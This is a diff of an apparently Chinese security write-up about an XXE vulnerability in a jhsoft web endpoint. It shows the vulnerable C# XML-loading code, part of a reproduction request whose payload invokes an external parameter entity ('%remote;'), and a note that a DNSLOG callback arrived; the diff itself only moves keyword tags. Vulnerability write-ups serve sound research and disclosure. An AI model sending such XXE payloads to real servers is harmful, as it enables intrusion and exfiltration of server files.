@@ -31,6 +31,14 @@ protected void Page_Load(object sender, EventArgs e)
   xmlDocument.Load(this.Request.InputStream);
 ```
 
+深入探索
+
+网络
+
+防病毒程序与恶意软件
+
+网络安全
+
 请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
@@ -45,14 +53,6 @@ Host: jhsoft.mrxn.net
 %remote;]>
 <root/>
 ```
-
-深入探索
-
-防病毒程序与恶意软件
-
-数据管理
-
-计算机服务器
 
 在DNSLOG平台成功收到请求
 
